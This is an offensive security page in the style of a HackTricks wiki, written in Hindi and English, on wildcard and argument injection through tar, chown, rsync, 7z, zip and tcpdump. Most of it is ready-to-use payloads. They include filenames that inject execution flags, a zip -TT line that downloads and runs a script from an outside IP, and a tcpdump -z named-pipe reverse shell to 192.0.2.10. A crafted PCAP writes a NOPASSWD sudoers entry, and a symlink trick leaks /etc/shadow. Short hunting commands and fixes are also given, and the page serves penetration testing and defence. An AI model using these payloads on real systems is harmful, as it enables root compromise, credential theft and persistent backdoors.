# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (जिसे *glob* भी कहा जाता है) **argument injection** तब होता है जब कोई privileged script `tar`, `chown`, `rsync`, `zip`, `7z`, … जैसे Unix binary को unquoted wildcard जैसे `*` के साथ चलाता है।
> चूंकि shell binary को execute करने से **पहले** wildcard को expand करता है, इसलिए working directory में files create कर सकने वाला attacker ऐसे filenames बना सकता है जो `-` से शुरू हों, ताकि उन्हें **data के बजाय options** के रूप में interpret किया जाए और प्रभावी रूप से arbitrary flags या यहां तक कि commands भी smuggle की जा सकें।
> यह page 2023-2025 के लिए सबसे उपयोगी primitives, recent research और modern detections को एकत्र करता है।

## chown / chmod

आप `--reference` flag का दुरुपयोग करके **किसी arbitrary file के owner/group या permission bits को copy** कर सकते हैं:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
जब root बाद में कुछ इस तरह execute करता है:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` inject किया जाता है, जिससे *सभी* matching files `/root/secret``file` के ownership/permissions को inherit कर लेते हैं।

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack)।  
विवरण के लिए classic DefenseCode paper भी देखें।

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** feature का दुरुपयोग करके arbitrary commands execute करें:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
जब root `tar -czf /root/backup.tgz *` चलाता है, तो `shell.sh` को root के रूप में execute किया जाता है।

### bsdtar / macOS 14+

हाल के macOS में default `tar` (`libarchive` पर आधारित) `--checkpoint` को implement नहीं करता, लेकिन आप **--use-compress-program** flag के माध्यम से code-execution प्राप्त कर सकते हैं, जो आपको एक external compressor निर्दिष्ट करने की अनुमति देता है।
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
जब कोई privileged script `tar -cf backup.tar *` चलाती है, तो `/bin/sh` शुरू हो जाएगा।

---

## rsync

`rsync` आपको `-e` या `--rsync-path` से शुरू होने वाले command-line flags के माध्यम से remote shell या यहाँ तक कि remote binary को भी override करने देता है:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
यदि root बाद में `rsync -az * backup:/srv/` के साथ directory को archive करता है, तो injected flag remote side पर आपका shell spawn कर देता है।

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode)।

---

## 7-Zip / 7z / 7za

यहाँ तक कि जब privileged script wildcard के आगे `--` को *defensively* prefix करता है (ताकि option parsing रुक जाए), 7-Zip format filename के आगे `@` लगाकर **file list files** को support करता है। इसे symlink के साथ combine करके आप *arbitrary files exfiltrate* कर सकते हैं:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
यदि root कुछ इस तरह execute करता है:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip `root.txt` (`→ /etc/shadow`) को file list के रूप में पढ़ने का प्रयास करेगा और विफल हो जाएगा, **जिससे contents को stderr पर print किया जाएगा**।

यह `-- *` के बावजूद काम करता है, क्योंकि 7-Zip CLI positional inputs के रूप में regular filenames और `@listfiles` दोनों को explicitly स्वीकार करता है, इसलिए `@root.txt` जैसा literal filename अभी भी विशेष रूप से treat किया जाता है।

---

## zip

जब कोई application user-controlled filenames को `zip` में पास करती है (या तो wildcard के माध्यम से या `--` के बिना names enumerate करके), तब दो बहुत practical primitives उपलब्ध होते हैं।

- RCE via test hook: `-T` “test archive” enable करता है और `-TT <cmd>` tester को arbitrary program से replace करता है (long form: `--unzip-command <cmd>`). यदि आप ऐसे filenames inject कर सकते हैं जो `-` से शुरू होते हैं, तो flags को अलग-अलग filenames में split करें, ताकि short-options parsing काम कर सके:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
नोट्स
- `'-T -TT <cmd>'` जैसी single filename को आज़माएँ नहीं — short options को प्रति character parse किया जाता है और यह fail हो जाएगा। दिखाए गए अनुसार अलग-अलग tokens का उपयोग करें।
- यदि app filenames से slashes हटा देता है, तो bare host/IP से fetch करें (default path `/index.html`) और `-O` के साथ locally save करें, फिर execute करें।
- यह समझने के लिए कि आपके tokens कैसे consume किए जा रहे हैं, parsing को `-sc` (processed argv दिखाएँ) या `-h2` (अधिक help) से debug कर सकते हैं।

Example (zip 3.0 पर local behavior):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: यदि web layer `zip` stdout/stderr को echo करता है (naive wrappers में आम), तो `--help` जैसे injected flags या bad options से होने वाली failures HTTP response में दिखाई देंगी, जिससे command-line injection की पुष्टि होगी और payload tuning में सहायता मिलेगी।

---

## Wildcard injection के प्रति vulnerable additional binaries (2023-2025 की त्वरित सूची)

निम्न commands का modern CTFs और वास्तविक environments में दुरुपयोग किया गया है। Payload हमेशा एक *filename* के रूप में ऐसे writable directory के अंदर बनाया जाता है, जिसे बाद में wildcard के साथ process किया जाएगा:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | File contents पढ़ना |
| `flock` | `-c <cmd>` | Command execute करना |
| `git`   | `-c core.sshCommand=<cmd>` | git के माध्यम से SSH द्वारा command execution |
| `scp`   | `-S <cmd>` | ssh के बजाय arbitrary program spawn करना |

ये primitives *tar/rsync/zip* classics की तुलना में कम common हैं, लेकिन hunting के दौरान इन्हें check करना उपयोगी है।

---

## Vulnerable wrappers और jobs की hunting

हाल के case studies से पता चला है कि wildcard/argv injection अब केवल **cron + tar** की समस्या नहीं है। यही bug class लगातार इन जगहों पर दिखाई देती है:

- web features, जो attacker-controlled upload directories से "download everything as zip/tar" करते हैं
- vendor/appliance debug shells, जो attacker-controlled filename/filter fields वाला **tcpdump** wrapper expose करते हैं
- backup या rotation jobs, जो writable directories पर `tar`, `rsync`, `7z`, `zip`, `chown`, या `chmod` चलाते हैं

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
त्वरित heuristics:

- `-- *` कई GNU tools के लिए एक अच्छा fix है, लेकिन `7z`/`7za` के लिए **नहीं**, क्योंकि `@listfiles` को अलग से parse किया जाता है।
- `zip` के लिए ऐसे wrappers खोजें जो user-controlled filenames को सीधे enumerate करते हों; short-option splitting (`-T` + `-TT <cmd>`) shell glob के बिना भी काम करता है।
- `tcpdump` के लिए उन wrappers पर विशेष ध्यान दें जो आपको **output file names**, **rotation settings**, या **capture-file replay** arguments को control करने देते हैं।

---

## tcpdump rotation hooks (-G/-W/-z): wrappers में argv injection के ज़रिए RCE

जब कोई restricted shell या vendor wrapper user-controlled fields (जैसे `"file name"` parameter) को strict quoting/validation के बिना concatenate करके `tcpdump` command line बनाता है, तो आप अतिरिक्त `tcpdump` flags को smuggle कर सकते हैं। `-G` (time-based rotation), `-W` (files की संख्या सीमित करना), और `-z <cmd>` (post-rotate command) का combo, tcpdump चलाने वाले user के रूप में arbitrary command execution प्रदान करता है (अक्सर appliances पर root)।

Preconditions:

- आप `tcpdump` को दिए जाने वाले `argv` को प्रभावित कर सकते हैं (जैसे `/debug/tcpdump --filter=... --file-name=<HERE>` जैसे wrapper के ज़रिए)।
- Wrapper file name field में spaces या `-`-prefixed tokens को sanitize नहीं करता।

Classic PoC (writable path से reverse shell script execute करता है):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
विवरण:

- `-G 1 -W 1` पहले matching packet के बाद तुरंत rotate को force करता है।
- `-z <cmd>` प्रत्येक rotation पर post-rotate command को एक बार चलाता है। कई builds में `<cmd> <savefile>` execute होता है। यदि `<cmd>` कोई script/interpreter है, तो सुनिश्चित करें कि argument handling आपके payload से मेल खाती हो।

Removable media के बिना variants:

- यदि आपके पास files लिखने के लिए कोई अन्य primitive है (जैसे कोई अलग command wrapper जो output redirection की अनुमति देता हो), तो अपनी script को किसी ज्ञात path में रखें और `-z /bin/sh /path/script.sh` या `-z /path/script.sh` trigger करें, यह platform semantics पर निर्भर करता है।
- कुछ vendor wrappers attacker-controllable locations पर rotate करते हैं। यदि आप rotated path को प्रभावित कर सकते हैं (symlink/directory traversal), तो आप `-z` को अपने पूर्ण नियंत्रण वाली content execute करने के लिए steer कर सकते हैं, बिना external media के।

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

बहुत सामान्य sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
समस्याएँ
- `*` glob और permissive patterns केवल पहले `-w` argument को सीमित करते हैं। `tcpdump` कई `-w` options स्वीकार करता है; अंतिम वाला प्रभावी होता है।
- यह rule अन्य options को सीमित नहीं करता, इसलिए `-Z`, `-r`, `-V`, आदि allowed हैं।

Primitives
- दूसरे `-w` के साथ destination path को override करें (पहला केवल sudoers को संतुष्ट करता है):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- सीमित tree से बाहर निकलने के लिए पहले `-w` के अंदर Path traversal:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` के साथ output ownership को force करें (कहीं भी root-owned files बनाता है):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` के माध्यम से crafted PCAP को replay करके arbitrary-content write (उदाहरण के लिए, sudoers line डालने के लिए):

<details>
<summary>ऐसा PCAP बनाएँ जिसमें exact ASCII payload हो और उसे root के रूप में लिखें</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` के साथ Arbitrary file read/secret leak (यह savefiles की सूची को interpret करता है)। Error diagnostics अक्सर lines को echo करते हैं, जिससे content leak हो सकता है:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## संदर्भ

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
